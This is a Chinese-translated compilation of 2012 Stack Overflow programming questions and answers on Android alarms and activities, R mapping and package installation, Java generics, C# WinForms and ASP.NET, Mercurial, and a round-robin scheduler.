            Intent myIntent = new Intent(context, SendOutstandingTransactions.class);
            myIntent.setAction("com.carefreegroup.startatboot.MyService");
            context.startService(myIntent);
        } catch (Exception e) {
            Toast.makeText(context, "There was an error somewhere, but we still"
                            + " received an alarm", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
} 
```

.

```
public class SendOutstandingTransactions extends IntentService {

    private static final String TAG = SendOutstandingTransactions.class.getSimpleName();
    NfcScannerApplication nfcscannerapplication;
    Cursor c;

    @Override
    public void onCreate() {
        nfcscannerapplication = (NfcScannerApplication)getApplication();
        super.onCreate();
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        nfcscannerapplication.loginValidate.deleteTableTransactions();
    }

    public SendOutstandingTransactions() {
        super("SendOutstandingTransactions");
    }
}// end of class 
```

只有在用户首次登录应用程序时才会调用定期删除事务的服务。从那时起它无限期地运行。如果用户重启手机怎么办？该服务只会在用户下次登录时恢复。

我有一个 BootReceiver，但我不知道如何附加 AlarmManager。我尝试了以下方法，但 ALARM_SERVICE 无法解决。这是在正确的路线上吗？

```
public class MyBootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        //  Intent myIntent = new Intent(context, SendOutstandingTransactions.class);
        //  myIntent.setAction("com.carefreegroup.startatboot.MyService");
        //  context.startService(myIntent);

        // get a Calendar object with current time
        Calendar cal = Calendar.getInstance();
        // add 5 minutes to the calendar object
        cal.add(Calendar.MINUTE, 1);
        Intent intent = new Intent(MyBootReceiver.this, AlarmReceiver.class);
        intent.putExtra("alarm_message", "deleting transactions");
        // In reality, you would want to have a static variable for the request code instead of 192837
        PendingIntent sender = PendingIntent.getBroadcast(context, 192837,
                                    intent, PendingIntent.FLAG_UPDATE_CURRENT);
        // Get the AlarmManager service
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        //am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
        am.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), 15000, sender);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:14:00.487

`getSystemService`可在`Context`. （您在 中收到它`onReceive`）

你应该做：

```
AlarmManager am = (AlarmManager) context.getSystemService(context.ALARM_SERVICE); 
```

# r - 从 shapefile 裁剪图

> ID：12820176
> 
> 赞同：3
> 
> 时间：2012-10-10T13:11:24.623
> 
> 标签：r, spatial

我正在尝试使用 Eurostat 提供的 shapefile 和数据生成 Choroplete 地图。shapefile 已在[此处](http://epp.eurostat.ec.europa.eu/cache/GISCO/geodatafiles/)下载：使用[此帖子](https://stackoverflow.com/questions/7044808/using-r-to-download-gzipped-data-file-extract-and-import-data)中的 JD Longs 代码。

这是重现我在下面发布的图的最少代码。

```
library(maptools)
tmpdir <- tempdir()
url <- 'http://ec.europa.eu/eurostat/cache/GISCO/geodatafiles/NUTS_2010_03M_SH.zip'
file <- basename(url)
download.file(url, file)
unzip(file, exdir = tmpdir )
shapeFile <- paste(tmpdir,"/Shape/data/NUTS_RG_03M_2010", sep="")

EU <- readShapeSpatial(shapeFile)
plot(EU) 
```

我的问题是我希望情节区域只关注欧洲，但由于海外地区（法国和西班牙），情节没有正确的重点。在上面的例子中，有没有一种简单的方法来“裁剪”绘图区域？

我想摆脱的多边形是“Country_Shape”的一部分，因此无法过滤掉它们。我试图通过在 plot 命令中定义 xlim 和 ylim 参数来实现我的目标，但没有成功。我使用 locator() 从图形设备获取坐标，但插入这些值并没有提供想要的结果。

![最小的例子](../Images/bbb9b007a9b869cd713b5c53777dca39.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T14:09:28.587

shapefile 投影文件 (Shape/data/NUTS_RG_03M_2010.prj) 显示如下：

> GEOGCS["GCS_ETRS_1989",DATUM["D_ETRS_1989",SPHEROID["GRS_1980",6378137.0,298.257222101]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]]

.prj 文件中包含的信息指定了 Shapefile 中几何数据的地理坐标系。为这个坐标系`xlim`尝试适当的坐标：`ylim`

```
R> plot(EU, ylim=c(30, 70), xlim=c(-10, 44))
R> box() 
```

![绘图示例](../Images/1e0f30fc2fa622bf8a5abde2ac06a444.png)

# android - 从当前活动返回时在上一个活动上显示一个按钮

> ID：12820180
> 
> 赞同：1
> 
> 时间：2012-10-10T13:11:30.240
> 
> 标签：android, android-intent

我想通过使用后退按钮返回在我之前的活动中看到一个编辑按钮。但是当我使用

```
 @Override
            public void onClick(View arg0) {
                // finish the current activity
                finish();

            } 
```

在我当前的活动中，它将返回到以前的活动，但编辑按钮不可见。

如果我`onResume`在以前的活动中使用

```
@Override
    protected void onResume() {
        super.onResume();
        btnEdit.setVisibility(View.VISIBLE);

    } 
```

那么它总是可见的，无论活动是恢复还是第一次创建。

我是Android开发新手，请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:19:07.710

覆盖 onRestart() 方法

```
@Override
protected void onRestart () {
    super.onResume();
    btnEdit.setVisibility(View.VISIBLE);

} 
```

或启动活动

```
startActivityForResult (Intent intent, int requestCode) 
```

方法和覆盖

```
@Override
protected void onActivityResult (int requestCode, int resultCode, Intent data){
    super.onActivityResult (requestCode,resultCode,data);
    btnEdit.setVisibility(View.VISIBLE);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:17:05.357

您可以创建一个布尔变量，当您完成并在 onResume 方法中使用此布尔值进行检查时，该变量可以设置为 true

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:25:45.900

好的，

当您启动 Activity 时，而不是`startActivity(intent)`使用`startActivityForResult(intent, 1989)`（1989 可以是您想要的任何 int）。

当您从新 Activity 返回时，在调用之前`finish()`执行以下操作：

```
 Intent returnIntent = new Intent();
        returnIntent.putExtra("resultBool", true);

        //Null checks, not strictly neccescary 

            if (getParent() == null)
            {
                setResult(Activity.RESULT_OK, returnIntent);
            }
            else
            {
                getParent().setResult(Activity.RESULT_OK, returnIntent);
            }

    finish(); 
```

然后在您的第一个 Activity 覆盖中`onActivityResult()`，如下所示：

```
 @Override
protected void onActivityResult(int requestCode, int resultCode, Intent data)
        {
            // The int you initially used
            if (requestCode == 1989)
            {
                if (resultCode == RESULT_OK)
                {
                    boolean result = data.getBooleanExtra("resultBool", false)

                    if (result)
                      //Show the button now

                }
            }
    } 
```

# c# - 在第一个控件之后动态添加第二个控件

> ID：12820182
> 
> 赞同：-3
> 
> 时间：2012-10-10T13:11:45.497
> 
> 标签：c#, winforms, dynamic-controls

在 c# 中，我在 flowlayoutpanel 上有一个动态控件。我希望在单击按钮的第一个控件之后放置另一个控件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:29:06.883

我这样做的方法是将控件的高度存储在全局变量中，然后每次添加控件时都会向其添加另一个高度。这为您提供了每次将位置向下移动以使控件显示在下方所需的数量。

然后在按钮单击事件上，我将创建一个新控件并通过使用 New drawing.point 并将 X 参数设置为控件的当前 X 位置，然后将 Y 参数设置为全局变量来设置位置。

```
int glHeightAccumalator = Control.Height; ' I would set this on the form load when you already have your first control in the Flow Layout Panel.

''Button Click Event

Control ctrl = new Control();
ctrl.Location = Drawing.Point(ctrl.Location.X, glHeightAccumalator);
FlowLayoutPanel.Controls.Add(ctrl);
glHeightAccumalator += ctrl.Height; 
```

# c# - 如何在 Windows 8 应用程序中显示“降价”？

> ID：12820183
> 
> 赞同：2
> 
> 时间：2012-10-10T13:11:55.017
> 
> 标签：c#, wpf, xaml, markdown

我有降价，如何在 win 8 应用程序中显示格式化文本？

* * *

**我尝试过的事情，可能对任何答案都有用，也可能没有用**

*   我尝试将 markdown 转换为 rtf 并在 RichTextBlock 中显示结果，但是我在将 markdown 转换为 rtf 时遇到问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:23:36.177

嗯。比我想象的还要棘手……

我建议使用[markdownsharp](http://code.google.com/p/markdownsharp/)从您的 markdown 派生 html 并将其显示在 html 视图中。~~（我确信“Windows 8 应用程序”至少有一个）~~

编辑

然后，您可以在 WebView 中显示它或按照[本文](http://code.msdn.microsoft.com/windowsapps/Html-to-RTF-a757fac5)转换为 rtf。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2016-01-14T15:35:04.717

我用 C# 编写了这个 Markdown 解析器，它导出为 HTML 和 XAML。如果生成 XAML，则可以使用 XamlReader 类访问它并将其显示在 WPF 应用程序中。（如果您愿意，也可以显示 HTML 版本。）

[https://github.com/PeterWaher/IoTGateway/tree/master/Content/Waher.Content.Markdown](https://github.com/PeterWaher/IoTGateway/tree/master/Content/Waher.Content.Markdown)

它是一个更大项目的一部分： [https ://github.com/PeterWaher/IoTGateway/](https://github.com/PeterWaher/IoTGateway/)

# java - 从 Java 中的泛型方法调用重载方法

> ID：12820185
> 
> 赞同：1
> 
> 时间：2012-10-10T13:12:00.383
> 
> 标签：java, generics, overloading

我有一个 Foo 和 Bar 对象的列表，以及每个对应对象的转换器。

```
public static void Convert(Foo1 a, Bar1 b) {
...
}
public static void Convert(Foo2 a, Bar2 b) {
...
}
etc 
```

但是，有些对象包含列表。
转换方法需要不同，因为 Bar1 与 Bar2 和 Bar3 等有很大不同，但我想创建一种方法来处理所有可能的列表。

是否可以根据列表的内容创建一个调用适当的非泛型方法的泛型方法？

到目前为止，我已经尝试过：

```
public static <T, S> void ConvertList(List<T> list, List<S> libList) {
    list = new ArrayList<T>(libList.size());

    for (int i = 0; i < libList.size(); ++i) {
        Convert(list.get(i), libList.get(i));
    }
} 
```

但这不会编译，因为“无法解析方法'Convert（T，S）'”

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:17:26.183

不，您不能这样做-重载是在*编译时*确定的，听起来您希望根据所涉及对象的执行时类型或至少根据执行时类型来调用不同的方法，`T`在执行时是完全未知的。

基于执行时类型的代码路径决策通常通过重载覆盖来处理，但在这种情况下这是否可行尚不清楚。`convert`如果您可以在每个子类中放置一个适当的方法`Foo??`，您可能会相应地进行约束`T`，`S`但基本上我们目前没有意识到太多的上下文。

您*可以*使用反射在执行时查找和调用最合适的方法，但这对编码来说会很痛苦，并且可能会显着变慢。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:14:36.680

您将不得不使用运行时多态性来实现这一点。

第 1 步：创建代表每种类型的接口。

```
public  interface Foo<T> {
    public void convert(T bar);
}
public interface Bar<T> {
    public void convert(T foo);
} 
```

第二步：创建实现类。

```
public class Foo1 implements Foo<Bar1> {

    @Override
    public void convert(Bar1 bar) {
        System.out.println("Foo1, Bar1");
    }
}
public public class Bar1 implements Bar<Foo1> {

    @Override
    public void convert(Foo1 foo) {
        System.out.println("Foo1, Bar1");
    }
}
public class Foo2 implements Foo<Bar2> {

    @Override
    public void convert(Bar2 bar) {
        System.out.println("Foo2, Bar2");
    }
}
public class Bar2 implements Bar<Foo2> {

    @Override
    public void convert(Foo2 foo) {
        System.out.println("Foo2, Bar2");
    }
} 
```

第三步：根据列表中的实例创建调用转换方法的函数。

```
public static <T extends Foo, S extends Bar> void convertList(List<T> list,
        List<S> libList) {

    for (int i = 0; i < libList.size(); ++i) {
        list.get(i).convert(libList.get(i));
    }
} 
```

第 4 步：创建样本列表数据并进行测试

```
 List<Foo<?>> listOfFoos = new ArrayList<Foo<?>>();
    List<Bar<?>> listOfBars = new ArrayList<Bar<?>>();
    listOfFoos.add(new Foo1());
    listOfFoos.add(new Foo2());
    listOfBars.add(new Bar1());
    listOfBars.add(new Bar2());
    convertList(listOfFoos,listOfBars); 
```

# php - Drupal 7：如何使用 PHP 获取此值

> ID：12820186
> 
> 赞同：1
> 
> 时间：2012-10-10T13:12:03.097
> 
> 标签：php, drupal, drupal-7, drupal-templates, drupal-entities

请参阅下面的附图。我需要通过 PHP 获取突出显示的值并将其放入我的模板之一。我不确定它是如何工作的，但是这个文本是作为[entityform](http://drupal.org/project/entityform)的一部分创建的。

![Drupal 主题信息](../Images/519bd1ad9bd6a3c8880b2bd505bc740b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:53:50.503

您需要实现[hook_form_alter](http://api.drupal.org/api/drupal/modules!system!system.api.php/function/hook_form_alter/7)才能访问表单元素。请阅读有关如何使用它的文档。

然后，您可以像这样访问该字段：

```
$value = $form[YOUR_FIELD]['#items'][0]['value']; 
```

希望这行得通……穆罕默德。

# c# - 类中的方括号

> ID：12820187
> 
> 赞同：4
> 
> 时间：2012-10-10T13:12:05.380
> 
> 标签：c#

> **可能重复：**
> [方括号之间的文本含义](https://stackoverflow.com/questions/771772/meaning-of-text-between-square-brackets)

我正在看的课程看起来像

```
public class SaveBundle
{
        /// <remarks/>
        [System.Xml.Serialization.XmlElementAttribute(Form = System.Xml.Schema.XmlSchemaForm.Unqualified)]
        public SaveBundleHeader Header
        {
            get
            {
                return this.headerField;
            }
            set
            {
                this.headerField = value;
            }
        }
} 
```

我不知道为什么存在 [System.Xml.Serialisztion.Xml 等] 或者它被称为什么来进一步研究它？

有人能告诉我 [] 的名称以及在这个例子中它的目的是什么吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T13:13:24.843

它是一个[属性](http://msdn.microsoft.com/en-us/library/z0w1kczw%28v=vs.80%29.aspx)，用于用可访问的元数据来装饰事物。您可以使用[反射](http://msdn.microsoft.com/en-us/library/ms173183%28v=vs.100%29.aspx)来获取这些数据并对其进行处理。框架的许多部分已经这样做了，如 MSDN 链接中用于标记类的属性的示例`Serializable`- 您可以根据元数据进行自定义序列化，但您并不总是需要这样做，因为“自动序列化”已经基于这个概念。

方括号是用于应用它们的语法，如您的示例中所示。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:13:42.067

这是在属性`XmlElement`上设置的属性`Header`

您应该可以像`XmlElementAttribute`在 MSDN 上那样查找它。喜欢[这里](http://msdn.microsoft.com/en-us/library/system.xml.serialization.xmlelementattribute.aspx)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T13:15:01.767

那是一个属性。

MSDN[在这里](http://msdn.microsoft.com/en-us/library/z0w1kczw.aspx)提供了有关属性的所有信息（它们是什么、它们的含义等等）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-10T13:14:58.557

为了在序列化类型时格式化您的属性

指示当 XmlSerializer 序列化或反序列化包含它的对象时，公共字段或属性表示 XML 元素。

# asp.net - UpdatePanel 中用户控件中的 Javascript 未运行

> ID：12820188
> 
> 赞同：0
> 
> 时间：2012-10-10T13:12:07.097
> 
> 标签：asp.net, ajax, c#-4.0, webforms

我有一个包含一些链接按钮的网络表单。
单击每个 LinkBut​​ton 时，我想加载不同的 UserControl。
我也想用 Ajax 来做。

我按照[此处](https://stackoverflow.com/a/3072091/1083652)和[此处](https://stackoverflow.com/a/10931323/1083652)
所述的两种方式进行了尝试 [两种方法都使用 UpdatePanel，第一种方法添加用户控件并更改其`Visible`属性，第二种方法使用`LoadControl`功能]

两者都有效（赞成他们！）但我仍然有一个问题 -
我无法在用户控件中运行 javascripts ......
它无法识别任何功能

当用户控件*不是动态*添加时，一切顺利

我发现的唯一解决方法是将javascript从用户控件移动到页面，但这并不好......

也试过[这个](https://stackoverflow.com/a/4416711/1083652)没有运气

任何帮助都会得到帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:19:20.783

对于异步请求使用`ScriptManager.RegisterStartupScript`方法

# r - 如何强制旧软件包安装在新版本的 R 上？

> ID：12820189
> 
> 赞同：6
> 
> 时间：2012-10-10T13:12:07.497
> 
> 标签：r

我无法安装`proj4string`到当前版本的 R (2.15.1) 中：

```
Warning message:
package ‘proj4string’ is not available (for R version 2.15.1) 
```

我认为这是因为 2.15.1 相当新，而且软件包还没有更新。是否有强制 R 安装旧版本的二进制包的一般机制（意识到可能会导致错误）？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-10T13:25:51.353

（从评论升级）

从档案中下载相关包（zip、tarball 等）并在本地安装，例如

```
install.packages("proj4string_x.y.z.zip",repos=NULL) 
```

（这不是字面意思：`x.y.z`代表包版本）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-31T17:04:41.090

您可以使用包 devtools 中的 install_version 来安装特定的包版本。

要查找软件包版本：

1.  搜索包的 CRAN 页面。例如，对于 ggmap，它是[https://CRAN.R-project.org/package=ggmap](https://CRAN.R-project.org/package=ggmap)

2.  检查存档的包。请参阅标题“下载”和“旧来源：”

**ggmap 包的示例代码**

```
devtools::install_version(  
  "ggmap",
  version = "2.6",
  repos = "http://cran.us.r-project.org"  
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-10T20:30:07.490

很抱歉再次撞到这篇文章，但我遇到了同样的问题。然后我发现我可以在包中使用以下几行：

```
install.packages("devtools")
devtools::install_github("slowkow/ggrepel") 
```

用包和 github repo 替换了“slowkow/ggrepel”。

我注意到 github 上的许多软件包都有详细信息。希望有帮助。

# android - 通过 USB 将两个安卓设备连接在一起

> ID：12820193
> 
> 赞同：8
> 
> 时间：2012-10-10T13:12:15.230
> 
> 标签：android, usb

是否可以在通过 USB 连接在一起的两个 android 设备之间进行通信。这是假设它们都是具有 USB OTG 的设备并且具有支持它的内核。

我试过搜索这个，但找不到一个好的起点。我假设其中一台设备需要充当主机，而另一台设备需要充当客户端，这正是我所需要的（实际上只需要一种方式通信）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T15:10:06.657

我尝试使用公头 A 到公头 microB 电缆和母头 A 到公头 microB 适配器连接两部手机（一部运行 ICS，另一部 JB），其中一部手机检测到另一部为USB 设备。

我是否真的能够以某种方式在他们之间进行交流是另一回事。也许有关此主题的[Android 开发人员文档](http://developer.android.com/guide/topics/connectivity/usb/host.html)可能会有所帮助。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-10T15:09:32.387

您可以将 mobodaemon 用于 android。

# mercurial - Mercurial Log 按文件扩展名

> ID：12820199
> 
> 赞同：2
> 
> 时间：2012-10-10T13:12:30.650
> 
> 标签：mercurial

我正在尝试找到一种方法来为某些文件类型（如 *.java）生成具有历史记录的 HG 日志文件。我需要与日志的差异......但同样只有 .java 文件。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:57:05.713

听起来你想要这样的东西：

`hg log --patch --rev "modifies('**.java')"`

有关如何使用特定规则定位 Mercurial 命令的信息，请参阅[`hg help revsets`](http://www.selenic.com/hg/help/revsets)和。[`hg help filesets`](http://www.selenic.com/hg/help/filesets)

# c++ - 我将如何实现循环调度模拟器？

> ID：12820202
> 
> 赞同：1
> 
> 时间：2012-10-10T13:12:33.390
> 
> 标签：c++, struct, scheduling, deque

使用如下所示的结构双端队列：

```
struct{
    int ID;
    int arrivalTime;
    int burstTime;
}; 
```

我将如何逐步完成结构的双端队列，以便输入如下所示：

```
0 0 3
1 5 2
3 8 4 
```

其中每一行分别是结构的 ID、到达时间和突发时间，我将能够打印出如下内容：

```
Time 0 Process 0 is running
Time 2 Process 0 is running
Time 3 Processor is Idle
Time 5 Process 1 is running
Time 7 Processor is Idle
Time 8 Process 3 is running
Time 10 Process 3 is running 
```

这个输出假设时间量为 2。有没有办法只用一个双端队列来做到这一点，或者创建另一个甲板作为 FIFO 队列来处理这个更容易？我知道我需要一个整数来跟踪已经过去了多少时间，但除此之外，这个问题真的让我很难过。它的空闲时间让我失望。C++ 代码甚至伪代码中的任何帮助都会有帮助。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:11:23.873

> 我知道我需要一个整数来记录已经过去了多少时间

我将从三个值开始 - 经过时间、当前进程和下一个进程。您的调度循环可能如下所示。为简单起见，我已将选择下一个进程的逻辑置于独立函数中：

```
time = 0;
currentProcess = deque.end();
while(some processes remaining)
{
    nextProcess = getNextProcess(time, currentProcess, deque);

    if(nextProcess->arrivalTime > time)
    {
        // nothing to do now
        // advance time by smaller of quota or nextProcess->arrivalTime
    } else {
        // at least one process has work ready
        if(currentProcess != nextProcess)
        {
            // preemt currentProcess
            // start nextProcess
            // advance time by the smaller of quota or nextProcess->burstTime
            // reduce nextProcess->burstTime by the time advanced
        } else {
            // continue with current process for quota or its remaining burstTime
            // reduce its burstTime
        }
    }

    currentProcess = nextProcess;
} 
```

实施`getNextProcess`取决于您的优先标准，幼稚的方法可能如下所示：

*   你`deque`从 position 开始`currentProcess + 1`。当你到达终点时，从头开始。
*   注意最小`arrivalTime`大于的过程`time`。让我们称之为`closestCandidate`
*   如果您使用 and 找到合适的流程`arrivalTime <= time`，请`burstTime > 0`返回该流程
*   如果您`currentProcess`再次点击，请决定哪个更好处理`currentProcess`并`closestCandidate`返回。

最后要做的一件事是有效地实现循环条件。我会把它留给你弄清楚。

注意：我不确定`deque`这里是否是最好的容器，我可能会`forward_list`在它们完成时使用和删除进程。您也可以在双端队列中执行此操作，但那是 O(n) 操作。

# c# - 在我的网站服务器 (ftp) 的文件夹中动态获取文件名

> ID：12820204
> 
> 赞同：1
> 
> 时间：2012-10-10T13:12:39.193
> 
> 标签：c#, asp.net, vb.net

我已经在我的网络服务器上上传了一些文件，例如 file1.pdf 和 file2.pdf 和 ... ->`ftp.MYWEBSITE.net\wwwroot\myfiles\`

现在我想获取所有这些文件名并动态显示在我的网站上，

例如，当客户访问地址 www.MYWEBSITE.com 时，他可以在列表中看到所有文件名！

请注意，MYWEBSITE 已上传到`wwwroot\mywebsite\default.aspx`

我应该使用带有 ftp 用户 ID 和密码的 ftp 连接吗？或者我可以直接转到 \myfiles 路径而不创建新的 ftp 连接？

我应该在 asp.net 中使用任何控件吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:52:10.490

您可以使用以下代码：

```
 void GetFiles()
        {
            DirectoryInfo d= new DirectoryInfo(strFolderPath);
            var files = d.GetFiles("*.pdf*");
            FileInfo[] subfileInfo = files.ToArray<FileInfo>();

            if (subfileInfo.Length > 0)
            {
                for (int j = 0; j < subfileInfo.Length; j++)
                {
                    bool isHidden = ((File.GetAttributes(subfileInfo[j].FullName) & FileAttributes.Hidden) == FileAttributes.Hidden);
                    if (!isHidden)
                    {
                        string strExtention = th.GetExtension(subfileInfo[j].FullName);
                        if (strExtention.Contains("pdf"))
                        {                            
                            string path = subfileInfo[j].FullName;
                            string name = bfileInfo[j].Name;                           
                        }
                    }
                }
            } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:19:53.110

如果您的 ftp 和网站都在同一台服务器上，您可以使用 .net 库中的文件对象读取文件列表并将其绑定到 ASP.NET 中的转发器控件

您可以使用`DirectoryInfo`和`FileInfo`对象相同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T14:08:58.307

不要使用 FTP。

1.  配置启用父路径：http: [//msdn.microsoft.com/en-us/library/ms524697%28v=vs.90%29.aspx](http://msdn.microsoft.com/en-us/library/ms524697%28v=vs.90%29.aspx)

    <system.web> <asp enableParentPaths="true"> </system.web>

2.  获取路径：string strFolderPath = Server.MapPath("~/../myfiles");

3.  使用 Arshad 提供的代码

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T14:11:28.683

您可以尝试使用此代码

```
class Program
{
    static void Main(string[] args)
    {
        FTPClient client = new FTPClient("ftp://localhost", "ftpUser", "ftpPass");
        List<string> files = client.DirectoryListing();
        foreach (string s in files)
        {
            Console.WriteLine(s);
        }
        Console.ReadLine();
    }
}

public class FTPClient
{
  // The hostname or IP address of the FTP server
  private string _remoteHost;

  // The remote username
  private string _remoteUser;

  // Password for the remote user
  private string _remotePass;

  public FTPClient(string remoteHost, string remoteUser, string remotePassword)
  {
    _remoteHost = remoteHost;
    _remoteUser = remoteUser;
    _remotePass = remotePassword;
  }

  public List<string> DirectoryListing()
  {
    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_remoteHost);
    request.Method = WebRequestMethods.Ftp.ListDirectory;
    request.Credentials = new NetworkCredential(_remoteUser, _remotePass);
    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
    Stream responseStream = response.GetResponseStream();
    StreamReader reader = new StreamReader(responseStream);

    List<string> result = new List<string>();

    while (!reader.EndOfStream)
    {
        result.Add(reader.ReadLine());
    }

    reader.Close();
    response.Close();
    return result;
 } 
```

}

# java - 寻找合适的设计模式

> ID：12820207
> 
> 赞同：1
> 
> 时间：2012-10-10T13:13:05.263
> 
> 标签：java, oop, design-patterns

我们的代码有几个处理器，每个处理器都有几个 api 方法，其中每个方法都被重载了可以接受集合的相同方法。
例如：

```
public class Foo {
    public X foo(Y y){...}
    public Collection<X> foo(Collection<Y> y){... // iterate and execute foo(y) ... }
    public Z bar(W w){...}
    public Collection<Z> bar(Collection<W> w){... // iterate and execute bar(w) ... }
}
public class Other{
    // also method and method on collection
} 
```

自然，那些关于集合的方法实际上是迭代的重复代码。
我们正在寻找的是一种创建某种模式或使用泛型的方法，因此**对集合的迭代将被实现一次**，也为此需要一种以某种方式传递方法名称的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:35:11.727

我建议[Startegy 模式](http://en.wikipedia.org/wiki/Strategy_pattern)。并执行以下操作：

```
public interface Transformer<X, Y> {
    Y transform( X input );
}

class Processor {

    public <X,Y> Collection<Y> process( Collection<X> input, Transformer<X, Y> transformer) {
        Collection<Y> ret = new LinkedList<Y>();
        // generic loop, delegating transformation to specific transformer
        for( X x : input) {
            ret.add( transformer.transform( x ) );
        }
        return ret;
    }
} 
```

例子：

```
public static void main( String[] args ) {
        List<String> strings = new LinkedList<String>();
        strings.add( "1" );
        strings.add( "2" );
        strings.add( "3" );

        Processor p = new Processor();

        Collection<Integer> numbers = p.process( strings, new Transformer<String, Integer>() {
            @Override
            public Integer transform( String input ) {
                return Integer.parseInt( input );
            }
        } );
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T16:03:39.470

RUAKH - 我选择实施你的反思建议（虽然，承认，我不喜欢反思）。所以，我做了类似下面的代码谢谢:)

```
public class Resource {
    private static final int CLIENT_CODE_STACK_INDEX;
    static {
        // Finds out the index of "this code" in the returned stack trace - funny but it differs in JDK 1.5 and 1.6
        int i = 0;
        for (StackTraceElement ste : Thread.currentThread().getStackTrace()) {
            i++;
            if (ste.getClassName().equals(Resource.class.getName())) {
                break;
            }
        }
        CLIENT_CODE_STACK_INDEX = i;
    }
    public static String getCurrentMethodName() {
        return Thread.currentThread().getStackTrace()[CLIENT_CODE_STACK_INDEX].getMethodName();
    }
    protected <IN,OUT> Collection<OUT> doMultiple(String methodName, Collection<IN> inCol, Class<?>... parameterTypes){
        Collection<OUT> result = new ArrayList<OUT>();
        try {
            Method m = this.getClass().getDeclaredMethod(methodName, parameterTypes);
            if (inCol==null || inCol.size()==0){
                return result;
            }
            for (IN in : inCol){
                Object o = m.invoke(this, in);
                result.add((OUT) o);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }
}

public class FirstResource extends Resource{
    public String doSomeThing(Integer i){
        // LOTS OF LOGIC
        return i.toString();
    }
    public Collection<String> doSomeThing(Collection<Integer> ints){
        return doMultiple(getCurrentMethodName(), ints, Integer.class);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-12T09:01:55.343

您应该使用策略模式。通过使用策略模式，您可以省略使代码更复杂的 if/else 用法。策略模式创建的耦合更少的代码更简单。通过使用策略模式，您可以获得更多动态配置代码的方法。所以我想建议你使用策略模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T15:28:39.623

我看不出反射在这里有什么帮助。您正在尝试替换一些微不足道的东西

```
public Collection<X> foo(Collection<Y> y) {
    List<X> result = Lists.newArrayList();
    for (Y e : y) result.add(foo(e));
    return result;
} 
```

可能要慢得多。我不认为保存这 3 行（多次）是值得的，但您可能想尝试注释处理（可能不使用注释）或动态代码生成。在这两种情况下，您都将按原样编写没有集合方法的原始类，并使用包含标量和集合方法的不同类。

* * *

或者您可能希望使其更具功能性：

```
public class Foo {
    public final RichFunction<Y, X> foo = new RichFunction<Y, X>() {
        X apply(Y y) {
            return foo(y);
        }
    }

    // after some refactoring the original method can be made private
    // or inlined into the RichFunction
    public X foo(Y y){...}

    // instead of calling the original method like
    // foo.foo(y)
    // you'd use
    // foo.foo.apply(y)
    // which would work for both the scalar and collection methods
}

public abstract class RichFunction<K, V> extends com.google.common.base.Function<K, V> {
    Collection<V> apply(Collection<K> keys) {
        List<V> result = Lists.newArrayList();
        for (K k : keys) result.add(apply(k));
        return result;
    }
} 
```

# c# - 在标签中插入 &

> ID：12820213
> 
> 赞同：0
> 
> 时间：2012-10-10T13:13:23.593
> 
> 标签：c#, winforms

编辑#2

> 我更改了标题名称，因为它不再代表我要问的问题。原来我的问题是在 ac#winforms 标签中显示 & 符号。
> 
> [在 Windows 窗体中的文本标签中输入“&”符号？](https://stackoverflow.com/questions/4325094/enter-symbol-into-a-text-label-in-windows-forms)
> 
> 那是问题的答案，结果是重复的

这是原来的

我目前正在使用 c# 和 sql。我写入数据库没有问题，当我使用 MS SQL Server Manager 检查字段时，我可以在 varchar 字段中看到 & 符号。但是当我使用 c# 检索它时，它似乎被省略了。

```
myTable.myColumn =" Me & You";

string testString="";
SQLConnection con = new SQLConnection(...)
SQLCommand command=new SQLCommand("Select Top 1 * from myTable",con)
SQLDataReader reader= command.ExecuteQuery()
while (reader.read())
{
    testString=reader["myColumn"].ToString();
    MessageBox.Show(testString);
} 
```

输出=我你

我是即时写的，它可能在语法上不正确。这是正常输出还是我可能在某个地方出错了？

